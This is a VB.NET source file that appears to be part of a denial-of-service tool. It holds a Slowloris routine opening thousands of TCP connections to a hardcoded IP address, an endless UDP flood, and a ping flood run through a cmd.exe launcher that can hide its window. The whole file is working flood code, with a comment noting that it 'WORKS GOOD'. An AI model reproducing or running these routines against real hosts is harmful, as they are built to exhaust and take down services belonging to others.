Imports System
Imports System.Collections.Generic
Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading

Public Class Methods

    Public Shared Host As New IPEndPoint(IPAddress.Parse("104.18.61.3"), 80)
        Public Shared IsEnabled As Boolean
        Public Shared Method As String
        Public Shared socketsPerThread As Integer = 2000


    Public Shared Sub WorkerThreadFORSLOWLORIS()
        Dim connectionList As List(Of Socket) = New List(Of Socket)()

        For i As Integer = 0 To socketsPerThread - 1
            Dim tempClient As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            tempClient.Connect(Host)
            connectionList.Add(tempClient)
        Next

        Dim o As Integer = 0
        While 0 < 10000

            For i As Integer = 0 To socketsPerThread - 1

                Try
                    connectionList(i).Send(System.Text.Encoding.Default.GetBytes("q98az58d9a5z2d895c6ezc126q5sdf12er5z6g25('§56ezrsfd2v56fd12gt5/*/-*aez895fd85qsf2562562&65é56eqsd2526fvfhg56,khkh12:5:ui6=o:2k;gj65,hn28f95q6df1256dqf1qdfs56dwcvsa5z6az5zd511az819d981azd18989ze89reezrg89reg89reg89egzr89erzera8811vd51651dqs6165dsqf561qds5f51qsdf65sdffg65b1dgf56b1rq56sfdf1ed6sq5f1q5ez6sdq3f1ez56qsd3f156eqs2d1f1v5f3sd521v56qs3d2f156zeqsfdze865f4er56gs1fd5zeaz5d1az56d156zad1rez56a856ef/56aze856fsdq26+2xw3c2ezr6+2856yutk25ç!6à25pou6lyik2jg56dg1256sf21dgs56fdg1s56zgtré6r1fd5615d5sqq6sfd561sfdq516sfdq516fsdq516dqfs516fsdq516dqsf516dqfs165dfqs165qdsf651dqfs516dqfs165dqfsdqfssfdq651f65za56az5516aeza561ez516ez16ezaf165af516afz516e5z1feaz51fzae51f516fez21dsq22d22f16df516d6sfqf516dqs56sf656sdqf516sdq1a56ez1fzd"), SocketFlags.None)
                Catch

                    Try
                        connectionList(i) = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                        connectionList(i).Connect(Host)
                    Catch
                    End Try
                End Try
            Next

            o += 1
            GC.Collect()
        End While
    End Sub


    ' Slowloris from : https://github.com/tegk/floods/blob/master/Slowloris.cs


    'UDP : myself
    Public Shared Sub WorkerThreadFORUDP(ByVal IP As String)
        Dim o As Integer = 0
        While 0 < 10000



            Dim udpClient As New UdpClient
            Dim GLOIP As IPAddress
            Dim bytCommand As Byte() = New Byte() {}
            GLOIP = IPAddress.Parse(IP)
            udpClient.Connect(GLOIP, 80)
            bytCommand = Encoding.ASCII.GetBytes("cds46546ds5c1qqsd56q4sd89ds556AEFZAE5ZF6FAE5Z151F651F19AZF98AZF89EZFA89R89GEZR89EGZF89EGZF898F9*/8/*/Z*ED8DQ5FS89DQSF562DQSF56QSDQDFS895DQSFDQSF8DQ5SFDQSFQ98DSF8Q9SF18915f4qfdsd4dsfq4sfd998sd89qdsDSssdqQDSDsqdQSDf89qf89qqqd9qd9qd989q899qdsfqds65dsf1dsq5f1dsq53f12sdq53f")
            udpClient.Send(bytCommand, bytCommand.Length)

            o += 1

        End While





    End Sub
    Public Shared Sub RunCMD(command As String, Optional ShowWindow As Boolean = False, Optional WaitForProcessComplete As Boolean = False, Optional permanent As Boolean = False)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.Arguments = " " + If(ShowWindow AndAlso permanent, "/K", "/C") + " " + command
        pi.FileName = "cmd.exe"
        pi.CreateNoWindow = Not ShowWindow
        If ShowWindow Then
            pi.WindowStyle = ProcessWindowStyle.Normal
        Else
            pi.WindowStyle = ProcessWindowStyle.Hidden
        End If
        p.StartInfo = pi
        p.Start()
        If WaitForProcessComplete Then Do Until p.HasExited : Loop
    End Sub

    Public Shared Sub ICMPAKAPingFlood(ByVal ip As String)
        Dim o As Integer = 0
        While o < 20
            RunCMD("ping -t -l 65500 " + ip, True)
            o += 1
        End While
    End Sub


    ''ping -t -l 65500 104.18.61.3
End Class
' Class Udp
'WORKS GOOD


'End Class



